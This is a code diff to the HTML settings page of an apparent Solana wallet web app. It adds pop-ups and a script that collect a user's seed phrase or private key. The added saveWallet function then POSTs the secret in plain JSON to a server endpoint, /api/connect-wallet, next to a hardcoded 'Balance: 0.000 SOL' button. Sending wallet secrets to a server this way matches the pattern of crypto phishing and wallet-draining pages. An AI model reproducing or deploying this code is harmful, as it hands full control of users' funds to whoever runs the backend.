@@ -7,19 +7,75 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+    <h1>⚙️ Settings</h1>
 
-    <div class="container">
-        <h2>⚙️ Settings</h2>
-        <button class="button" onclick="connectWallet()">🔑 Connect Wallet</button>
-        <input type="text" id="walletInput" placeholder="Enter private key">
-        <button class="button" id="saveWallet" onclick="saveWallet()" style="display:none;">Save Wallet</button>
-        <button class="button" onclick="alert('Your balance: 0.000 SOL')">💰 View Balance</button>
-        <button class="button" onclick="disconnectWallet()">🔌 Disconnect Wallet</button>
-        <button class="button" onclick="toggleDarkMode()">🌙 Toggle Dark Mode</button>
+    <!-- 🔘 Bottom-Aligned Buttons -->
+    <div class="bottom-nav">
+        <button class="button" onclick="showPopup('walletPopup')">Connect Wallet</button>
+        <button class="button" onclick="disconnectWallet()">Disconnect Wallet</button>
+        <button class="button">Balance: 0.000 SOL</button>
     </div>
 
-    <button class="back-btn" onclick="location.href='index.html'">🔙 Back</button>
+    <!-- 📢 Connect Wallet Pop-up -->
+    <div id="walletPopup" class="popup">
+        <h2>🔗 Connect Wallet</h2>
+        <button class="button small" onclick="showPopup('seedPopup')">Use Seed Phrase</button>
+        <button class="button small" onclick="showPopup('privateKeyPopup')">Use Private Key</button>
+        <button class="close-btn" onclick="closePopup('walletPopup')">Close</button>
+    </div>
 
-    <script src="script.js"></script>
+    <!-- 🔑 Seed Phrase Input Pop-up -->
+    <div id="seedPopup" class="popup">
+        <h2>🌱 Enter Seed Phrase</h2>
+        <textarea id="seedPhrase" placeholder="Enter your 12 or 24-word seed phrase"></textarea>
+        <button class="button small" onclick="saveWallet('seedPhrase')">Save</button>
+        <button class="close-btn" onclick="closePopup('seedPopup')">Close</button>
+    </div>
+
+    <!-- 🔑 Private Key Input Pop-up -->
+    <div id="privateKeyPopup" class="popup">
+        <h2>🔑 Enter Private Key</h2>
+        <input type="text" id="privateKey" placeholder="Enter your private key">
+        <button class="button small" onclick="saveWallet('privateKey')">Save</button>
+        <button class="close-btn" onclick="closePopup('privateKeyPopup')">Close</button>
+    </div>
+
+    <!-- 📌 JavaScript for Pop-ups & Wallet Handling -->
+    <script>
+        function showPopup(id) {
+            document.getElementById(id).classList.add("show");
+        }
+
+        function closePopup(id) {
+            document.getElementById(id).classList.remove("show");
+        }
+
+        function saveWallet(type) {
+            const data = type === "seedPhrase" ? document.getElementById("seedPhrase").value : document.getElementById("privateKey").value;
+            
+            if (!data) {
+                alert("⚠️ Please enter your " + (type === "seedPhrase" ? "seed phrase." : "private key."));
+                return;
+            }
+
+            fetch("/api/connect-wallet", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ [type]: data })
+            })
+            .then(res => res.json())
+            .then(response => {
+                alert(response.message);
+                closePopup(type === "seedPhrase" ? "seedPopup" : "privateKeyPopup");
+            })
+            .catch(error => console.error("❌ Error:", error));
+        }
+
+        function disconnectWallet() {
+            fetch("/api/disconnect-wallet", { method: "DELETE" })
+            .then(() => alert("✅ Wallet disconnected!"))
+            .catch(error => console.error("❌ Error:", error));
+        }
+    </script>
 </body>
 </html>
